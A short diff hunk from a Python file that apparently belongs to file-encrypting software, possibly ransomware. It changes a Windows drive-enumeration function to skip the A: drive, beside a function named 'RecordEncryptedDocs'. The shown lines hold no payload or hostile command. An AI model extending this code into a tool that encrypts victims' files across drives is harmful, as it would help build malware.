@@ -156,9 +156,12 @@ def RecordEncryptedDocs(docs):
 	
 def GetDriveLetters():
 
-	drives = win32api.GetLogicalDriveStrings()
-	drives = drives.split('\000')[:-1]
+	api_call = win32api.GetLogicalDriveStrings()
+	drives = api_call.split('\000')[:-1]
 	
+	if 'A:\\' in drives:
+		drives.remove('A:\\')
+		
 	return drives
 	
 	
